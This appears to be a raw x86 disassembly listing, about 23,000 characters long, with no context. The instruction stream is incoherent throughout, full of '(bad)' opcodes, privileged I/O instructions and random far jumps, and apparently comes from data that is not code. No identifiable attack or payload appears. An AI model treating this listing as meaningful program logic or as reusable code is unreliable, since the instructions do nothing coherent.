  41ff00:	lahf   
  41ff01:	adc    DWORD PTR [esi+0x280c3384],0x7263b575
  41ff0b:	imul   esp,DWORD PTR [ebx+0x676a3a3b],0x1d
  41ff12:	mov    ds:0x30e09ab1,eax
  41ff17:	nop
  41ff18:	mov    fs,WORD PTR [esi+0x24]
  41ff1b:	pop    eax
  41ff1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff1d:	pop    edx
  41ff1e:	test   al,0x47
  41ff20:	data16 arpl WORD PTR [ebx],bx
  41ff23:	arpl   WORD PTR [ebx],ax
  41ff25:	xchg   edi,eax
  41ff26:	pop    edi
  41ff27:	(bad)  
  41ff28:	xor    ah,cl
  41ff2a:	push   ebx
  41ff2b:	mov    ch,0xe8
  41ff2d:	adc    bh,BYTE PTR [ecx+0x7cff96fe]
  41ff33:	fsubrp st(2),st
  41ff35:	push   0x17
  41ff37:	outs   dx,BYTE PTR ds:[esi]
  41ff38:	mov    bl,BYTE PTR [edx]
  41ff3a:	jnp    0x41ff03
  41ff3c:	cmp    DWORD PTR [ecx+eiz*8+0x6d],eax
  41ff40:	fisub  WORD PTR [esi-0x4b]
  41ff43:	push   esi
  41ff44:	mov    ebx,0xe086ebb7
  41ff49:	lds    edx,FWORD PTR [edi]
  41ff4b:	cs mov esp,0xe059d686
  41ff51:	or     BYTE PTR [edi],ch
  41ff53:	xor    dl,BYTE PTR [edi]
  41ff55:	repnz ins BYTE PTR es:[edi],dx
  41ff57:	sbb    eax,0xf85a6416
  41ff5c:	pop    ebp
  41ff5d:	loop   0x41ff38
  41ff5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff60:	sbb    DWORD PTR [ebx+0x178d7fb],esp
  41ff66:	pop    eax
  41ff67:	(bad)  
  41ff68:	addr16 sbb al,0x54
  41ff6b:	mov    eax,0xc492c0db
  41ff70:	idiv   DWORD PTR [ebx]
  41ff72:	lock mov cl,0x54
  41ff75:	(bad)  
  41ff76:	aad    0xc4
  41ff78:	sub    eax,0x222468e5
  41ff7d:	jmp    0x41ff47
  41ff7f:	mov    DWORD PTR [edi+0x79b56265],esp
  41ff85:	mov    bl,0x73
  41ff87:	or     al,0xe1
  41ff89:	or     al,0xfd
  41ff8b:	fxch   st(5)
  41ff8d:	(bad)  
  41ff8e:	sbb    al,0x59
  41ff90:	add    eax,0xa58a0d9f
  41ff95:	pop    ecx
  41ff96:	cs mov bl,0x15
  41ff99:	xor    al,0x9e
  41ff9b:	fnstcw WORD PTR [edi]
  41ff9d:	pop    edi
  41ff9e:	sbb    al,0x8a
  41ffa0:	loope  0x42001a
  41ffa2:	out    0x4c,eax
  41ffa4:	inc    esp
  41ffa5:	dec    edx
  41ffa6:	mov    ebx,0xb57703ee
  41ffab:	jns    0x41ff9f
  41ffad:	std    
  41ffae:	adc    edi,0xffffffa9
  41ffb1:	sub    BYTE PTR [edi+0x63],cl
  41ffb4:	psraw  mm3,QWORD PTR [eax]
  41ffb7:	sbb    eax,DWORD PTR [eax]
  41ffb9:	sbb    al,0x4
  41ffbb:	in     eax,0x14
  41ffbd:	mov    esi,0xb50cdb6d
  41ffc2:	xchg   edx,eax
  41ffc3:	push   edi
  41ffc4:	mov    ds:0xb14c6d6e,eax
  41ffc9:	iret   
  41ffca:	scas   eax,DWORD PTR es:[edi]
  41ffcb:	ret    
  41ffcc:	pop    edx
  41ffcd:	inc    esi
  41ffce:	ins    BYTE PTR es:[edi],dx
  41ffcf:	bound  ebp,QWORD PTR [ebx]
  41ffd1:	push   ss
  41ffd2:	lock mov al,0x5c
  41ffd5:	xchg   al,dl
  41ffd7:	jbe    0x41ff88
  41ffd9:	sahf   
  41ffda:	mov    dh,0x56
  41ffdc:	rcl    BYTE PTR [esi-0x6525f671],0x71
  41ffe3:	adc    DWORD PTR [edx+0xd],esp
  41ffe6:	aad    0x88
  41ffe8:	mov    ch,0x8b
  41ffea:	add    al,0xad
  41ffec:	cmp    DWORD PTR [ebx-0x50957ce],esi
  41fff2:	xchg   edx,eax
  41fff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fff4:	les    esp,FWORD PTR [edi+0x78]
  41fff7:	mov    dl,0x4b
  41fff9:	shr    BYTE PTR [eax+0x10d8fad6],0x7c
  420000:	mov    ds:0xd238d9e6,eax
  420005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420006:	nop
  420007:	ror    BYTE PTR [eax+0x44],0x34
  42000b:	fnstsw WORD PTR [ecx]
  42000d:	xor    eax,0xa1f158dc
  420012:	dec    esi
  420013:	aaa    
  420014:	jo     0x41fff1
  420016:	pop    edi
  420017:	mov    edi,0x43abe28a
  42001c:	push   eax
  42001d:	sbb    esp,ebp
  42001f:	cld    
  420020:	pop    ecx
  420021:	jbe    0x42009b
  420023:	ret    0xa6a9
  420026:	xlat   BYTE PTR ds:[ebx]
  420027:	sbb    dl,BYTE PTR [eax-0x2e143523]
  42002d:	pop    ss
  42002e:	xchg   edx,eax
  42002f:	add    esi,DWORD PTR [esi]
  420031:	push   edx
  420032:	or     BYTE PTR [edx],0x7
  420035:	mov    cl,0xc3
  420037:	adc    eax,0x9e2972d4
  42003c:	das    
  42003d:	(bad)  
  42003e:	mov    edx,0xd1c611aa
  420043:	mov    ds:0x89ae4586,al
  420048:	xchg   ebx,edi
  42004a:	and    esp,eax
  42004c:	cmp    esi,edi
  42004e:	add    cl,ch
  420050:	xchg   BYTE PTR [edx],ah
  420052:	jns    0x420089
  420054:	or     DWORD PTR [edx-0x4b411aae],ebx
  42005a:	sub    al,0xd5
  42005c:	mov    al,ds:0xc707fb78
  420061:	lods   eax,DWORD PTR ds:[esi]
  420062:	jne    0x42005c
  420064:	cmp    DWORD PTR [esi],0xf08531a0
  42006a:	jns    0x4200b4
  42006c:	cmp    al,0x6e
  42006e:	gs ret 0x6684
  420072:	dec    ebx
  420073:	xor    eax,DWORD PTR [edi-0x537f5184]
  420079:	and    BYTE PTR [edi+0x2a755810],dh
  42007f:	jns    0x420060
  420081:	outs   dx,DWORD PTR ds:[esi]
  420082:	enter  0x97bf,0xd3
  420086:	push   edi
  420087:	jecxz  0x420042
  420089:	je     0x42006e
  42008b:	xchg   ecx,eax
  42008c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42008d:	mov    al,0xb6
  42008f:	test   DWORD PTR [esi+0x7aacaecd],ecx
  420095:	jg     0x4200a1
  420097:	gs dec edx
  420099:	mov    al,ds:0x51b201a1
  42009e:	sbb    ch,dl
  4200a0:	inc    esi
  4200a1:	mul    esp
  4200a3:	mov    dh,0x22
  4200a5:	pop    es
  4200a6:	xor    al,0xef
  4200a8:	imul   BYTE PTR [eax]
  4200aa:	lea    edi,[ebp+0xe33ce6e]
  4200b0:	loope  0x42009c
  4200b2:	mov    eax,0xc8d623d0
  4200b7:	cmp    DWORD PTR [edx+0x68ef94b8],ecx
  4200bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200be:	scas   al,BYTE PTR es:[edi]
  4200bf:	ds mov al,0x6f
  4200c2:	jge    0x4200e1
  4200c4:	clc    
  4200c5:	mov    ebx,DWORD PTR [edi]
  4200c7:	sbb    BYTE PTR [ecx+0x36],al
  4200ca:	adc    BYTE PTR [eax-0x442cf0d0],bl
  4200d0:	mov    esi,0xe3ed044
  4200d5:	add    DWORD PTR [edx+0x4a4e08ca],ebx
  4200db:	js     0x420129
  4200dd:	sub    DWORD PTR [edx],ebx
  4200df:	stos   BYTE PTR es:[edi],al
  4200e0:	cld    
  4200e1:	xor    dl,BYTE PTR ds:0xb0f0bc72
  4200e7:	enter  0x736e,0xe8
  4200eb:	push   ss
  4200ec:	dec    ecx
  4200ed:	sbb    eax,0xad251864
  4200f2:	repz mov ecx,0x85d0ca9
  4200f8:	add    DWORD PTR [esi+0x20c6397a],ecx
  4200fe:	or     al,0xea
  420100:	mov    eax,ds:0xffd3a048
  420105:	add    dh,ch
  420107:	and    bh,BYTE PTR [eax+0x7]
  42010a:	or     edx,DWORD PTR [ecx]
  42010c:	aaa    
  42010d:	mov    ecx,0xe3c2cf36
  420112:	repz test al,0xe4
  420115:	dec    esi
  420116:	and    edi,DWORD PTR ds:0x6a2897e3
  42011c:	jg     0x420131
  42011e:	mov    BYTE PTR [ecx+0x7cf7cf72],cl
  420124:	aaa    
  420125:	adc    eax,0xfd33e17a
  42012a:	xchg   ebx,eax
  42012b:	mov    esp,0x1dac6d71
  420130:	mov    eax,ds:0xfe685845
  420135:	push   esi
  420136:	mov    WORD PTR [ecx],cs
  420138:	mov    WORD PTR [ecx-0x33ac0492],es
  42013e:	js     0x420182
  420140:	cli    
  420141:	das    
  420142:	push   eax
  420143:	xor    al,0xcc
  420145:	and    esp,DWORD PTR [ecx+0x5be1d27a]
  42014b:	stos   BYTE PTR es:[edi],al
  42014c:	cli    
  42014d:	fist   DWORD PTR [edx+0x73]
  420150:	inc    DWORD PTR [edi-0x2]
  420153:	push   ds
  420154:	cli    
  420155:	stos   DWORD PTR es:[edi],eax
  420156:	out    dx,eax
  420157:	sub    DWORD PTR [esi-0x6736a569],eax
  42015d:	(bad)  
  42015e:	jne    0x42013c
  420160:	and    DWORD PTR ds:0xbfda6d49,ecx
  420166:	retf   0x1ed5
  420169:	pop    es
  42016a:	push   0xfc414539
  42016f:	push   ss
  420170:	mov    dh,0xb
  420172:	stos   DWORD PTR es:[edi],eax
  420173:	jp     0x4201ea
  420175:	or     DWORD PTR [ebp+0x67],ebx
  420178:	lds    edx,FWORD PTR [ebx+ebx*4]
  42017b:	add    BYTE PTR [edx],cl
  42017d:	nop
  42017e:	add    ebx,esi
  420180:	hlt    
  420181:	and    eax,0x186238cf
  420186:	jno    0x42012a
  420188:	push   eax
  420189:	sahf   
  42018a:	push   0x9
  42018c:	shr    BYTE PTR es:[edx+0x49e76f52],1
  420193:	lea    ecx,[edi-0x2e0e388]
  420199:	xor    BYTE PTR [ebp+0x8],dl
  42019c:	ins    DWORD PTR es:[edi],dx
  42019d:	iret   
  42019e:	lock in eax,0x2
  4201a1:	cmp    al,0xc5
  4201a3:	iret   
  4201a4:	xchg   ebx,eax
  4201a5:	jo     0x4201c6
  4201a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201a8:	jl     0x4201c6
  4201aa:	sub    eax,esi
  4201ac:	mov    esi,0xcd66450
  4201b1:	mov    ecx,0x46f36a58
  4201b6:	dec    edi
  4201b7:	iret   
  4201b8:	cmp    BYTE PTR ss:[ebp+eax*8-0x29],ah
  4201bd:	imul   esi,DWORD PTR [edx-0x70]
  4201c1:	mov    WORD PTR [edi+0x56],gs
  4201c4:	es gs push ebp
  4201c7:	mov    ah,0x8e
  4201c9:	add    al,0xc3
  4201cb:	daa    
  4201cc:	dec    ebx
  4201cd:	push   0xd7c18632
  4201d2:	pop    ss
  4201d3:	out    0x7b,eax
  4201d5:	(bad)  
  4201d6:	adc    esi,DWORD PTR [ecx]
  4201d8:	mov    al,ds:0xd3a2e1cb
  4201dd:	jecxz  0x420172
  4201df:	xchg   esp,eax
  4201e0:	mov    edx,0xcd2be98c
  4201e5:	test   DWORD PTR [ecx+0x3617187c],0x6fbe91a6
  4201ef:	sbb    eax,0x6876a47c
  4201f4:	xor    al,0x8e
  4201f6:	xor    DWORD PTR [ecx],ecx
  4201f8:	scas   al,BYTE PTR es:[edi]
  4201f9:	jmp    0x42017f
  4201fb:	jb     0x420202
  4201fd:	outs   dx,DWORD PTR ds:[esi]
  4201fe:	mov    ebp,0x25792918
  420203:	jge    0x420246
  420205:	in     eax,0x6a
  420207:	mov    ds:0xabd17576,al
  42020c:	into   
  42020d:	jp     0x4201e8
  42020f:	mov    ah,0xb0
  420211:	call   0xd97:0x1824157a
  420218:	pop    ecx
  420219:	popf   
  42021a:	stos   DWORD PTR es:[edi],eax
  42021b:	pushf  
  42021c:	mov    ebp,DWORD PTR [edx+0x67]
  42021f:	lea    edi,[ecx+0x62e75932]
  420225:	lds    edx,FWORD PTR [ebx]
  420227:	repz pop ds
  420229:	daa    
  42022a:	leave  
  42022b:	jb     0x4201e2
  42022d:	xchg   ecx,eax
  42022e:	sbb    al,0x3e
  420230:	add    BYTE PTR [esi+0x1e],al
  420233:	sub    edi,edx
  420235:	or     DWORD PTR [ebx],esi
  420237:	outs   dx,DWORD PTR ds:[esi]
  420238:	push   esi
  420239:	pop    ds
  42023a:	ret    
  42023b:	adc    DWORD PTR ds:0x43fb1,eax
  420241:	daa    
  420242:	mov    al,ds:0x59c1aaa2
  420247:	call   0x5b46662e
  42024c:	mov    ebp,ebp
  42024e:	cld    
  42024f:	jg     0x42023f
  420251:	test   DWORD PTR [ebp-0x3c38805b],edi
  420257:	mov    eax,0xaa314ecf
  42025c:	cmp    bl,dh
  42025e:	adc    eax,0x5cd4b4bd
  420263:	jb     0x42021f
  420265:	enter  0x3973,0x5d
  420269:	mov    ds:0x2f87dad3,eax
  42026e:	in     eax,dx
  42026f:	bound  ebx,QWORD PTR [edi]
  420271:	inc    ebx
  420272:	inc    ebp
  420273:	daa    
  420274:	nop
  420275:	fs pop es
  420277:	xchg   esi,eax
  420278:	mov    DWORD PTR [edi+0x55],esp
  42027b:	aas    
  42027c:	dec    ebp
  42027d:	sti    
  42027e:	out    dx,eax
  42027f:	bound  esi,QWORD PTR [ecx-0x67]
  420282:	xlat   BYTE PTR ds:[ebx]
  420283:	add    eax,ebp
  420285:	mov    edx,0xb380ad04
  42028a:	pop    edx
  42028b:	push   edi
  42028c:	ficom  DWORD PTR ds:0x3f8e4feb
  420292:	not    bl
  420294:	push   0xc01b3329
  420299:	push   cs
  42029a:	ins    BYTE PTR es:[edi],dx
  42029b:	dec    ecx
  42029c:	xchg   BYTE PTR [ecx],dl
  42029e:	sbb    eax,DWORD PTR [ebp-0x2cef15e4]
  4202a4:	jae    0x4202ef
  4202a6:	fs pop ds
  4202a8:	aas    
  4202a9:	dec    ebx
  4202aa:	call   0x2c119441
  4202af:	retf   
  4202b0:	dec    ebp
  4202b1:	imul   eax,DWORD PTR [edx-0x2731ae76],0xc4386f93
  4202bb:	pusha  
  4202bc:	inc    esp
  4202be:	sahf   
  4202bf:	or     bl,bl
  4202c1:	rcr    edx,0xa
  4202c4:	ror    DWORD PTR [edx],1
  4202c6:	sbb    al,0x36
  4202c8:	in     eax,dx
  4202c9:	jmp    0x4202d1
  4202cb:	shl    DWORD PTR [esi],cl
  4202cd:	or     cl,BYTE PTR [edi]
  4202cf:	cmp    ecx,0x70
  4202d2:	lahf   
  4202d3:	xchg   ecx,eax
  4202d4:	cmc    
  4202d5:	pop    eax
  4202d6:	aas    
  4202d7:	mov    bl,0x51
  4202d9:	sub    al,0xe6
  4202db:	pusha  
  4202dc:	push   ds
  4202dd:	fadd   st(2),st
  4202df:	adc    eax,0x3cdcd44c
  4202e4:	ffree  st(5)
  4202e6:	sbb    eax,DWORD PTR ds:0xb8d3df4f
  4202ec:	mov    dl,0x8b
  4202ee:	sub    dh,BYTE PTR [esi]
  4202f0:	adc    ebp,DWORD PTR [ebx-0x7ed0a8f6]
  4202f6:	push   ebx
  4202f7:	sbb    BYTE PTR [edi],0x4a
  4202fa:	aad    0x8b
  4202fc:	es push ebp
  4202fe:	cmp    eax,0xbb11ed84
  420303:	aas    
  420304:	lahf   
  420305:	xor    ebx,DWORD PTR [ecx+0x22]
  420308:	mov    dl,0x9
  42030a:	push   es
  42030b:	inc    ebx
  42030c:	outs   dx,DWORD PTR ds:[esi]
  42030d:	mov    ch,0xe7
  42030f:	retf   
  420310:	sahf   
  420311:	mov    al,ds:0x3b918be3
  420316:	js     0x4202ed
  420318:	imul   ecx,DWORD PTR [ecx+edi*4+0x2d1a9fdf],0x76afa80c
  420323:	sbb    eax,0x838438b
  420328:	sbb    BYTE PTR [ebp+0x5c801a21],ah
  42032e:	test   ch,al
  420330:	aaa    
  420331:	push   ebx
  420332:	dec    edx
  420333:	sub    dl,ah
  420335:	pop    ds
  420336:	or     BYTE PTR [ebp+0x37],ch
  420339:	call   0xe597aea6
  42033e:	ins    BYTE PTR es:[edi],dx
  42033f:	push   edi
  420340:	cwde   
  420341:	rcr    DWORD PTR [ebx-0x22],0x7f
  420345:	jmp    0x77adb323
  42034a:	jecxz  0x42035d
  42034c:	call   0x624b:0x570a2b37
  420353:	jno    0x420304
  420355:	aad    0x10
  420357:	sbb    al,0x41
  420359:	fisttp WORD PTR [esi]
  42035b:	(bad)  
  42035c:	loope  0x4203c9
  42035e:	mov    edi,0xf6d702f9
  420363:	icebp  
  420364:	mov    ch,0x8d
  420366:	jp     0x4202f0
  420368:	inc    ebx
  420369:	mov    ds:0x7d24b8d7,al
  42036e:	lock fist DWORD PTR [edx+ecx*4-0x5cec4095]
  420376:	pushf  
  420377:	push   0xffffffa0
  420379:	(bad)  
  42037a:	stc    
  42037b:	out    dx,al
  42037c:	sub    eax,esp
  42037e:	mov    esp,0x8cb27378
  420383:	in     al,dx
  420384:	gs mov cl,0xce
  420387:	aam    0x71
  420389:	inc    ebx
  42038a:	lds    edx,FWORD PTR [eax-0x39b3c5fb]
  420390:	sti    
  420391:	mov    WORD PTR [edx-0x53a97d84],cs
  420397:	icebp  
  420398:	push   cs
  420399:	retf   0x9f44
  42039c:	mov    esp,0xfcd86ccf
  4203a1:	int    0xf
  4203a3:	ds mov edi,0x8f43ede6
  4203a9:	sbb    eax,0xf2bae5ef
  4203ae:	sub    eax,0x42b7d375
  4203b3:	out    dx,al
  4203b4:	fist   DWORD PTR [ebp-0x1a]
  4203b7:	fisttp QWORD PTR ds:0x3dc4d7b2
  4203bd:	add    DWORD PTR [ebp-0x4d879123],ebp
  4203c3:	js     0x420411
  4203c5:	push   edx
  4203c6:	sub    dl,BYTE PTR ds:0x63440300
  4203cc:	sub    eax,0xd10e7a76
  4203d1:	or     BYTE PTR [ebx-0x45a0271a],0x33
  4203d8:	inc    edx
  4203d9:	pop    esp
  4203da:	jnp    0x42038f
  4203dc:	into   
  4203dd:	adc    eax,0xa9fe47bf
  4203e2:	popf   
  4203e3:	daa    
  4203e4:	adc    ecx,eax
  4203e6:	fdivrp st(6),st
  4203e8:	jnp    0x420429
  4203ea:	shl    al,1
  4203ec:	data16 fistp QWORD PTR cs:[bp+di-0x39]
  4203f2:	int3   
  4203f3:	push   ebp
  4203f4:	aas    
  4203f5:	lahf   
  4203f6:	dec    BYTE PTR [eax+0x61]
  4203f9:	jnp    0x42040b
  4203fb:	call   0xa76f5640
  420400:	mov    edi,0x461fd5b2
  420405:	mov    cl,0x86
  420407:	and    dh,BYTE PTR [eax+eiz*8]
  42040a:	xchg   edi,esp
  42040c:	aam    0x6a
  42040e:	pop    eax
  42040f:	xchg   esi,eax
  420410:	xor    BYTE PTR [edx+0x28d75d5],dh
  420416:	mov    bh,0xe9
  420418:	ss leave 
  42041a:	push   ebp
  42041b:	shl    BYTE PTR [ecx],0x8d
  42041e:	out    dx,eax
  42041f:	enter  0xc865,0xaf
  420423:	mov    eax,ds:0x83fd6152
  420428:	test   DWORD PTR [edi+0x2a0a77ca],0x7a27bd34
  420432:	jns    0x4203f0
  420434:	dec    eax
  420435:	pusha  
  420436:	dec    ebp
  420437:	ins    DWORD PTR es:[edi],dx
  420438:	or     BYTE PTR [esp+edx*2+0x5e],al
  42043c:	or     BYTE PTR [esi-0x1a],ch
  42043f:	enter  0x79d3,0xc8
  420443:	imul   ecx,DWORD PTR [esi],0x949408a9
  420449:	sbb    ecx,edx
  42044b:	mov    bl,0x6
  42044d:	adc    dh,ah
  42044f:	std    
  420450:	jle    0x4204a0
  420452:	fmul   DWORD PTR [edi-0x7f]
  420455:	cwde   
  420456:	jmp    0x7607:0xe1b99d08
  42045d:	pusha  
  42045e:	pushf  
  42045f:	add    edi,DWORD PTR [ebx+0x6a4b58e1]
  420465:	popa   
  420466:	adc    al,BYTE PTR [eax]
  420468:	popa   
  420469:	mov    al,0xd2
  42046b:	std    
  42046c:	hlt    
  42046d:	fdivp  st(2),st
  42046f:	push   0x2ec79504
  420474:	sti    
  420475:	sub    ch,BYTE PTR [eax]
  420477:	mov    bh,0x43
  420479:	sbb    al,0x9d
  42047b:	mov    cl,0x6f
  42047d:	in     eax,dx
  42047e:	jbe    0x42049d
  420480:	add    ecx,DWORD PTR [eax]
  420482:	es (bad) 
  420484:	pusha  
  420485:	fiadd  DWORD PTR [esi-0x25]
  420488:	mov    cl,0x90
  42048a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42048b:	jae    0x42044d
  42048d:	push   ebp
  42048e:	fst    DWORD PTR [ecx]
  420490:	(bad)  
  420491:	adc    BYTE PTR [eax+0x7fc125d4],ch
  420497:	shl    DWORD PTR [edx+0x1f873382],0xb4
  42049e:	pop    ss
  42049f:	loop   0x420424
  4204a1:	fwait
  4204a2:	mov    ah,0xc5
  4204a4:	mov    ds:0x222791e1,eax
  4204a9:	dec    eax
  4204aa:	fwait
  4204ab:	jo     0x420432
  4204ad:	out    dx,eax
  4204ae:	data16 hlt 
  4204b0:	cmc    
  4204b1:	mov    fs,WORD PTR gs:[ebx+0x3b6c939f]
  4204b8:	jle    0x4204f0
  4204ba:	fiadd  WORD PTR [esi+0x60]
  4204bd:	or     al,BYTE PTR [eax+0x9]
  4204c0:	push   ebp
  4204c1:	ret    
  4204c2:	(bad)  
  4204c3:	and    eax,0x49daefc4
  4204c8:	sub    ebp,DWORD PTR [eax+0x38347c]
  4204ce:	dec    esp
  4204cf:	outs   dx,DWORD PTR ds:[esi]
  4204d0:	std    
  4204d1:	xor    al,0x0
  4204d3:	cwde   
  4204d4:	enter  0x38e1,0x25
  4204d8:	test   DWORD PTR [ebp+0x53],ebx
  4204db:	push   es
  4204dc:	mov    ch,0x8c
  4204de:	xchg   DWORD PTR [eax],ecx
  4204e0:	adc    eax,ebx
  4204e2:	(bad)  
  4204e3:	popa   
  4204e4:	dec    ebx
  4204e5:	mov    ebx,DWORD PTR [esi]
  4204e7:	or     ah,0x2f
  4204ea:	ficom  WORD PTR [ebp-0x60]
  4204ed:	in     eax,0x3c
  4204ef:	jle    0x42054d
  4204f1:	ins    DWORD PTR es:[edi],dx
  4204f2:	mov    dl,0x64
  4204f4:	sub    DWORD PTR [eax+ecx*8-0x4f722207],ecx
  4204fb:	sbb    eax,0xc1016326
  420500:	test   DWORD PTR [edx+0x53807ccc],eax
  420506:	out    dx,eax
  420507:	ins    DWORD PTR es:[edi],dx
  420508:	rcr    BYTE PTR [ebp-0x40b26887],cl
  42050e:	popf   
  42050f:	add    ecx,DWORD PTR [esi]
  420511:	push   cs
  420512:	stos   BYTE PTR es:[edi],al
  420513:	mov    eax,ds:0x63e80544
  420518:	das    
  420519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42051a:	push   0xffffffe1
  42051c:	out    dx,eax
  42051d:	hlt    
  42051e:	sub    ebp,esp
  420520:	or     DWORD PTR [edx-0x6cc41af9],ecx
  420526:	cmp    dl,BYTE PTR [edi-0x231e954a]
  42052c:	ss sahf 
  42052e:	movups xmm5,XMMWORD PTR [edi-0x1d]
  420532:	lock adc ah,BYTE PTR [edx-0x42]
  420536:	pop    edi
  420537:	adc    DWORD PTR [ebx-0x516c44c2],esi
  42053d:	mov    dl,0xeb
  42053f:	mov    bl,0x6f
  420541:	hlt    
  420542:	aaa    
  420543:	xchg   ebx,eax
  420544:	xchg   BYTE PTR [esp+ebp*1+0x1b5159af],ch
  42054b:	fisttp QWORD PTR [edi+eax*2]
  42054e:	jno    0x4204f7
  420550:	dec    esi
  420551:	jge    0x4204f6
  420553:	jmp    0xa5a3c59c
  420558:	ds sahf 
  42055a:	fldenv [eax+0x7a]
  42055d:	xor    DWORD PTR [ebx-0x17],ecx
  420560:	mov    esi,0x30a28acd
  420565:	add    esp,DWORD PTR [eax+0xff62069]
  42056b:	jne    0x4205af
  42056d:	rol    DWORD PTR [eax],cl
  42056f:	push   ss
  420570:	or     al,BYTE PTR [eax+esi*4-0x18]
  420574:	or     BYTE PTR [ebx],bl
  420576:	mov    dh,dh
  420578:	cmp    esi,0xfc3f9d50
  42057e:	and    DWORD PTR [edx],edi
  420580:	mov    DWORD PTR [eax+edi*1+0x52],edx
  420584:	lds    edx,FWORD PTR [eax+ecx*2]
  420587:	inc    eax
  420588:	jnp    0x420574
  42058a:	mov    BYTE PTR [ebx],cl
  42058c:	sbb    eax,0x551881b3
  420591:	mov    esp,0xa9073a8d
  420596:	inc    ebx
  420597:	sbb    DWORD PTR [ecx+0x429cabfd],ebx
  42059d:	jmp    0x5c67a6f3
  4205a2:	jl     0x4205ef
  4205a4:	push   cs
  4205a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205a6:	sub    bh,0x23
  4205a9:	adc    BYTE PTR [edx-0x16],bl
  4205ac:	fs cmc 
  4205ae:	mov    edx,ss
  4205b0:	or     al,0x0
  4205b2:	or     DWORD PTR [ecx+0x36],esi
  4205b5:	jmp    0xf5cf:0xb7e517b2
  4205bc:	retf   
  4205bd:	fidiv  WORD PTR [eax-0x469eec20]
  4205c3:	outs   dx,BYTE PTR ds:[esi]
  4205c4:	mov    cl,0xf9
  4205c6:	out    0xc8,eax
  4205c8:	mov    BYTE PTR [edx],ah
  4205ca:	(bad)
  4205cd:	cmp    ah,BYTE PTR [ebx-0x69]
  4205d0:	pop    edx
  4205d1:	cmp    eax,0xb4f17d76
  4205d6:	sahf   
  4205d7:	mov    bh,0xa8
  4205d9:	jg     0x420637
  4205db:	lods   eax,DWORD PTR ds:[esi]
  4205dc:	or     esp,DWORD PTR [ecx]
  4205de:	pop    eax
  4205df:	pop    ebx
  4205e0:	inc    esp
  4205e1:	out    0x6e,al
  4205e3:	fmul   DWORD PTR ds:0x581a6af8
  4205e9:	fnsave [edx+edi*8-0x3a]
  4205ed:	add    al,BYTE PTR [ebp+0x5a]
  4205f0:	inc    esi
  4205f1:	jbe    0x4205dc
  4205f3:	adc    BYTE PTR [ebp-0x56dcac7c],0x50
  4205fa:	jb     0x420589
  4205fc:	lock inc eax
  4205fe:	jmp    0x847c8d82
  420603:	int3   
  420604:	or     DWORD PTR [esi+0x5d],0xffffffee
  420608:	pop    ss
  420609:	xor    bh,ah
  42060b:	adc    ch,al
  42060d:	retf   
  42060e:	or     DWORD PTR [ebp-0x29],eax
  420611:	pop    es
  420612:	push   ss
  420613:	sahf   
  420614:	outs   dx,DWORD PTR ds:[esi]
  420615:	mov    ds:0x3ee966bd,eax
  42061a:	ins    BYTE PTR es:[edi],dx
  42061b:	pusha  
  42061c:	sbb    eax,0xc0374d54
  420621:	inc    ebp
  420622:	imul   edx,DWORD PTR [esi+eiz*2],0xffffffb8
  420626:	mov    al,0x4f
  420628:	jnp    0x4205bc
  42062a:	jnp    0x420693
  42062c:	jb     0x420633
  42062e:	dec    esp
  42062f:	fninit 
  420631:	pop    esp
  420632:	sub    edi,DWORD PTR [ebx]
  420634:	fs dec ebx
  420636:	push   ebx
  420637:	ss mov ebx,0x8e43e448
  42063d:	fisttp WORD PTR [eax+0x20]
  420640:	push   esi
  420641:	mov    al,bh
  420643:	fmul   DWORD PTR [esi]
  420645:	push   ebp
  420646:	jmp    0x967f7f47
  42064b:	add    ebx,edx
  42064d:	lods   eax,DWORD PTR ds:[esi]
  42064e:	retf   
  42064f:	mov    WORD PTR [edx],es
  420651:	xor    esi,DWORD PTR [edi+eiz*8]
  420654:	sub    ebx,DWORD PTR [ecx]
  420656:	push   eax
  420657:	retf   0xae98
  42065a:	pop    edi
  42065b:	nop
  42065c:	pop    esi
  42065d:	int    0x3
  42065f:	lahf   
  420660:	pop    edi
  420661:	jmp    0x8841:0x542bdc43
  420668:	and    DWORD PTR [eax+0x7b02a01e],esi
  42066e:	jecxz  0x4206ae
  420670:	inc    ebx
  420671:	inc    eax
  420672:	jle    0x42063c
  420674:	(bad)  
  420675:	aas    
  420676:	iret   
  420677:	pop    ebp
  420678:	xor    al,0x98
  42067a:	dec    edx
  42067b:	dec    ecx
  42067c:	out    0xd,al
  42067e:	adc    esi,DWORD PTR [eax-0x2c]
  420681:	pop    edx
  420682:	xchg   DWORD PTR [ebp+0x1bb48a90],edx
  420688:	xchg   DWORD PTR [ebx+0x1869b57c],edx
  42068e:	sar    BYTE PTR [ecx+ebp*4-0x4b33189e],0x2b
  420696:	pushf  
  420697:	push   ecx
  420698:	retf   0x3ad4
  42069b:	push   0xffffffc2
  42069d:	rcl    BYTE PTR [eax-0x400be947],1
  4206a3:	sbb    DWORD PTR [eax-0x69907b42],0xffffffb1
  4206aa:	sub    BYTE PTR [ecx+0x7],bl
  4206ad:	lock rdmsr 
  4206b0:	cmp    ebp,DWORD PTR [esi+0x58]
  4206b3:	xchg   DWORD PTR ds:0x43848174,edi
  4206b9:	mov    bh,0xef
  4206bb:	pop    esi
  4206bc:	bound  edx,QWORD PTR [edi]
  4206be:	scas   eax,DWORD PTR es:[edi]
  4206bf:	mov    ebp,0x78cfc723
  4206c4:	dec    eax
  4206c5:	dec    esi
  4206c6:	xor    al,0x1e
  4206c8:	sbb    eax,0x9ff3d268
  4206cd:	adc    eax,0x2e545b00
  4206d2:	pop    esi
  4206d3:	and    eax,0x18b54a0
  4206d8:	mov    esp,0xf5c1bf46
  4206dd:	mov    al,BYTE PTR [edx+0x21edee7]
  4206e3:	jg     0x4206d5
  4206e5:	jbe    0x420680
  4206e7:	enter  0x5b3a,0x55
  4206eb:	neg    BYTE PTR ds:0xd11d8517
  4206f1:	add    BYTE PTR [ebx+eiz*1-0x55],0x79
  4206f6:	mov    BYTE PTR [esi+0x3f],cl
  4206f9:	jg     0x420692
  4206fb:	jecxz  0x420779
  4206fd:	mov    cl,0x81
